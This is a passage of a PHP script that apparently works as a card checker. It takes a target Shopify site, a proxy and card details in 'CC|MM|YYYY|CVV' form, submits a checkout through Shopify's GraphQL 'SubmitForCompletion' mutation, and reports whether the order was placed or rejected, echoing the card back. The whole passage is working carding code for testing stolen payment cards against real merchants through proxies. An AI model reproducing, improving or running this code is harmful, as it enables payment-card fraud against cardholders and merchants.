                'proposedExemptions' => []
            ],
            'tip' => ['tipLines' => []],
            'note' => ['message' => null, 'customAttributes' => []],
            'localizationExtension' => ['fields' => []],
            'nonNegotiableTerms' => null,
            'optionalDuties' => ['buyerRefusesDuties' => false]
        ],
        'attemptToken' => $stableId,
        'metafields' => [],
        'analytics' => ['requestUrl' => $checkoutUrlFinal]
    ];
    
    $payload = [
        'query' => $MUTATION_SUBMIT,
        'variables' => $submitVariables,
        'operationName' => 'SubmitForCompletion'
    ];
    
    $resp = httpRequest($graphqlUrl, 'POST', $headers, $payload, $proxy);
    if ($resp['status'] !== 200) {
        return ['status' => false, 'response' => 'Submit failed: ' . $resp['status']];
    }
    
    $submitData = json_decode($resp['body'], true);
    $submitResult = $submitData['data']['submitForCompletion'] ?? [];
    $resultType = $submitResult['__typename'] ?? '';
    
    if ($resultType === 'SubmitSuccess' || $resultType === 'SubmittedForCompletion' || $resultType === 'SubmitAlreadyAccepted') {
        $receipt = $submitResult['receipt'] ?? [];
        if ($receipt && isset($receipt['__typename']) && $receipt['__typename'] === 'ProcessedReceipt') {
            return ['status' => true, 'response' => 'ORDER_PLACED', 'gateway' => $gateway, 'price' => $totalPrice, 'currency' => $currency];
        }
        return ['status' => true, 'response' => 'ORDER_SUBMITTED', 'gateway' => $gateway, 'price' => $totalPrice, 'currency' => $currency];
    }
    
    if ($resultType === 'SubmitFailed') {
        $reason = $submitResult['reason'] ?? 'Unknown';
        return ['status' => false, 'response' => cleanResponse($reason)];
    }
    
    if ($resultType === 'SubmitRejected') {
        $errors = $submitResult['errors'] ?? [];
        foreach ($errors as $error) {
            $code = $error['code'] ?? '';
            if ($code) {
                return ['status' => false, 'response' => $code];
            }
        }
        return ['status' => false, 'response' => 'Rejected'];
    }
    
    return ['status' => false, 'response' => 'Unknown result: ' . $resultType];
}

// ======= API ENDPOINT =======
$site = $_GET['site'] ?? null;
$ccString = $_GET['cc'] ?? null;
$proxy = $_GET['proxy'] ?? null;
$variant = $_GET['variant'] ?? null;

if (!$site) {
    echo json_encode([
        'error' => 'Missing site parameter',
        'status' => false
    ]);
    exit;
}

if (!$ccString) {
    echo json_encode([
        'error' => 'Missing cc parameter (format: CC|MM|YYYY|CVV)',
        'status' => false
    ]);
    exit;
}

$ccParts = explode('|', $ccString);
if (count($ccParts) !== 4) {
    echo json_encode([
        'error' => 'Invalid CC format. Use: CC|MM|YYYY|CVV',
        'status' => false
    ]);
    exit;
}

list($cc, $mes, $ano, $cvv) = array_map('trim', $ccParts);

// Process the checkout
$result = processShopify($site, $cc, $mes, $ano, $cvv, $variant, $proxy);

$response = [
    'Gateway' => $result['gateway'] ?? 'UNKNOWN',
    'Price' => floatval($result['price'] ?? 0),
    'Response' => cleanResponse($result['response'] ?? 'ERROR'),
    'Status' => $result['status'] ?? false,
    'cc' => $ccString
];

echo json_encode($response);
?>
